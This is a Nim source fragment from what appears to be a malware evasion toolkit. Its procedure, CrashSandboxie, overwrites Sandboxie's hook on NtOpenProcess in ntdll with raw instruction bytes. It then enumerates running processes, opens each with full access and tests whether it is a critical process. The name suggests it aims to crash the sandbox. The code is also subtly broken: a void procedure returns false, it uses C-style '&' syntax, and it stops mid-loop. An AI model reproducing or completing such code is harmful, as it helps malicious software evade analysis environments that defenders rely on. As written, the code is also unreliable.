import winim
import constants

proc CrashSandboxie*(): void =
    when not defined(amd64):
        let unhookedInstructions: array[5, byte] = [0xB8, 0x26, 0x00, 0x00, 0x00]
        var hModule = LLGetModuleHandle("ntdll.dll")
        var ntopenprocess = LLGetProcAddress("NtOpenProcess")
        WriteProcessMemory(GetCurrentProcess(), ntopenprocess, unhookedInstructions, 5, 0)

        var pe32: PROCESSENTRY32

        var hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if hSnap == INVALID_HANDLE_VALUE:
            return false

        pe32.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))

        if Process32First(hSnap, &pe32) == FALSE:
            NtClose(hSnap)
            return false

        while Process32Next(hSnap, &pe32):
            var smth = false
            var pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID)
            IsProcessCritical(pHandle, &smth)